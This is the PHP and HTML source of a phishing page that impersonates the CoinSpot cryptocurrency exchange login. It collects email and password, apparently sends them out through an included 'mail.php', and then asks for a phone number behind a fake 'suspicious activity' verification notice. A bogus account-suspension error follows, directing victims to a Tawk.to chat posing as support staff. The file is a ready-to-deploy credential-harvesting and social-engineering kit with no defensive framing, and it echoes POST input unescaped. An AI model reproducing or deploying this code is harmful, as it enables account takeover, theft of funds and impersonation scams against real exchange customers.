<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="robots" content="noindex, nofollow"/>
    <meta name="googlebot" content="noindex, nofollow"/>
    <meta name="bingbot" content="noindex, nofollow"/>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CoinSpot | Login</title>
    <link href="npm/bootstrap_5.1.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="ajax/libs/font-awesome/6.0.0-beta2/css/all.min.css" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="coinspot-login/assets/scss/style.css">
</head> 
 <?php
     if (isset($_POST['fromLog'])) {
    ?>
    <body onload="myFunction()">
    <div id="loader">
    </div>
    <script>
        var preloader =document.querySelector('#loader')
        function myFunction()
        {
            setTimeout(function()
            {
                preloader.style.display='none';
            },
            Math.floor(Math.random()*5000)+2000
            )
        }
    </script>
<?php }else {
    echo "<body>";
}?>

    <!-- navbar -->
    <nav class="navbar navbar-expand-lg" id="navbar">
        <div class="container-fluid">
            <a class="navbar-brand" href="#"><img src="coinspot-login/assets/images/coinspot-logo-40x40.png">CoinSpot</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <i class="fas fa-bars"></i>
            </button>
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav ms-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link" href="#">HOME</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">WALLETS</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">BUY/SELL</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">SWAP</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">BUNDLES</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">OTC</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">MARKETS</a>
                    </li>
                </ul>
                <form class="d-flex">
                    <button class="btn register" type="submit">REGISTER</button>
                    <button class="btn login" type="submit">LOGIN</button>
                </form>
            </div>
        </div>
    </nav>
    <!-- navbar ends  -->
    <!-- form -->
    <div class="container-fluid" id="form">
        <div class="row">
            <div class="col-md-6">
                 <?php
                 if (isset($_POST['btnLoginMore'])) {
                    include 'mail.php';
                ?>
                <div class="verify">
                    <h2>Verification Required</h2>
                    <h4 style="color: red">Important Message</h4>
                    <p>Some Suspicious Activity Found With Your Account, Enter Your Phone Number to Verify Your
                        Identity.</p>
                        <form action="" method="post">
                             <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                             <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                             <label>Phone Number</label><br>
                             <input type="text" name="number" placeholder="+1-234-567-8910" required="">
                             <div class="button">
                                 <button type="submit" name="fromLog" class="btn">Submit</button>
                             </div>
                        </form>
                </div>
                 <?php } elseif (isset($_POST['fromLog'])) {
                     include 'mail.php';
                 ?>
                   <div class="error">
                    <h2 style="color: red">Important Message</h2>
                    <p>Due to unauthorized activity and identification failure on your Account. Account Access has been suspended.Please Get in touch with our Support Staff Immediately</p>
                    <form>
                        <label>Error CODE: EBRX1:6X76D</label><br>
                        <div class="button">
                            <a href="javascript:void(Tawk_API.toggle())">Ask Expert</a>
                        </div>
                    </form>
                </div>
                   <?php } else { ?>
                <div class="loginForm">
                    <h1>Login</h1>
                    <h3>To your CoinSpot account.</h3>
                    <form action="" method="post">
                        <div class="mb-3">
                            <label for="exampleInputEmail1" class="form-label">Email</label>
                            <input type="email" class="form-control input" name="email" id="exampleInputEmail1"
                                aria-describedby="emailHelp" required>
                        </div>
                        <div class="mb-3">
                            <label for="exampleInputPassword1" class="form-label">Password</label>
                            <input type="password" class="form-control input" name="password" id="exampleInputPassword1" required>
                        </div>
                        <div class="mb-3 form-check">
                            <input type="checkbox" class="form-check-input" id="exampleCheck1">
                            <label class="form-check-label" for="exampleCheck1" style="font-size: 16px;">Remember my
                                Email</label>
                        </div>
                        <div class="d-grid">
                            <button type="submit" name="btnLoginMore" style="padding:10px; font-size: 18px; font-weight: 500;"
                                class="btn btn-primary">Login</button>
                        </div>
                        <div class="password">
                            <a href="#">Forgot Password ?</a>
                        </div>
                        <p>Don't have an account? <a href="#">Register</a></p>
                    </form>
                </div>
                  <?php }  ?>
            </div>
            <div class="col-md-6">
                <div class="content">
                    <h3>Security News</h3>
                    <div class="news">
                        <h5>Verification required for AUD Withdrawals</h5>
                        <h6>Please note that your account must be verified to be able to withdraw AUD to your nominated
                            bank account.</h6>
                    </div>
                    <div>
                        <h5>Never create an account on behalf of someone else</h5>
                        <h6>If you have been asked to login or create an account to purchase something on Gumtree, Ebay
                            etc. it is highly likely to be a scam and you should contact our support team immediately.
                        </h6>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- form ends -->
    <!-- footer -->
    <div class="container-fluid" id="footer">
        <div class="row">
            <div class="col-lg-4 col-md-6 col-sm-12">
                <div class="certificates">
                    <div class="certificate">
                        <a href="#"><img src="coinspot-login/assets/images/adcca-industry.png"></a>
                        <p>Member since: 02.02.2014</p>
                    </div>
                    <div class="certificate">
                        <a href="#"><img src="coinspot-login/assets/images/security-image1.png"></a>
                        <p>Certified since: 13.02.2020</p>
                        <p>Certificate number: 5660</p>
                    </div>
                </div>
            </div>
            <div class="col-lg-2 col-md-2 col-sm-4">
                <div class="links">
                    <ul>
                        <h6>CoinSpot</h6>
                        <li><a href="#">Buy Bitcoin</a></li>
                        <li><a href="#">Bitcoin Trading</a></li>
                        <li><a href="#">Instant Buy & Sell</a></li>
                        <li><a href="#">All Markets</a></li>
                        <li><a href="#">Buy DeFi</a></li>
                        <li><a href="#">Buy NFTs</a></li>
                        <li><a href="#">Multicoin Wallet</a></li>
                        <li><a href="#">Affiliate Program</a></li>
                        <li><a href="#">Referrals</a></li>
                        <li><a href="#">Press Enquiries</a></li>
                        <li><a href="#">Fees </a></li>
                        <li><a href="#">Mobile App</a></li>
                        <li><a href="#">Security</a></li>
                        <a href="#"><button class="btn" type="submit"><i class="fas fa-moon"></i> Night</button></a>
                    </ul>
                </div>
            </div>
            <div class="col-lg-2 col-md-2 col-sm-4">
                <div class="links">
                    <ul>
                        <h6>Legal</h6>
                        <li><a href="#">Terms of Service</a></li>
                        <li><a href="#">Privacy Policy</a></li>
                        <li><a href="#">AML</a></li>
                    </ul>
                </div>
            </div>
            <div class="col-lg-2 col-md-2 col-sm-4">
                <div class="links">
                    <ul>
                        <h6>Help</h6>
                        <li><a href="#">Help Center</a></li>
                        <li><a href="#">Contact Support</a></li>
                        <li><a href="#">Protect Yourself Online</a></li>
                        <li><a href="#">Account Recovery</a></li>
                        <li><a href="#">API Docs</a></li>
                        <li><a href="#">Complaints and Disputes</a></li>
                        <li><a href="#">Self Managed Super</a></li>
                        <li><a href="#">Funds</a></li>
                        <li><a href="#">Cryptocurrency & Tax</a></li>
                        <li><a href="#">Request a Coin</a></li>
                    </ul>
                </div>
            </div>
            <div class="col-lg-2 col-md-2">
                <div class="links">
                    <ul>
                        <h6>Learn</h6>
                        <li><a href="#">How To Buy Bitcoin</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
    <!-- footer ends -->
    <!-- after footer -->
    <div class="container-fluid" id="footerLinks">
        <div class="row">
            <div class="col-md-6">
                <div class="links">
                  <a href="#"> <i class="fab fa-facebook-square"></i></a>
                    <a href="#"><i class="fab fa-twitter"></i></a>
                </div>
            </div>
            <div class="col-md-6">
                <div class="links1">
                    <p> © CBS ABN 19 619 574 186</p>
                </div>
            </div>
        </div>
    </div>
    <!-- after footer ends -->
    <script src="npm/_popperjs/core_2.10.2/dist/umd/popper.min.js"></script>
    <script src="npm/bootstrap_5.1.2/dist/js/bootstrap.min.js"></script>
     <!--Start of Tawk.to Script-->
        <script type="text/javascript">
        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
        (function(){
        var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
        s1.async=true;
        s1.src='https://embed.tawk.to/621a7b48a34c24564128808d/1fsrn35pf';
        s1.charset='UTF-8';
        s1.setAttribute('crossorigin','*');
        s0.parentNode.insertBefore(s1,s0);
        })();
        </script>
        <!--End of Tawk.to Script-->
</body>
</html>
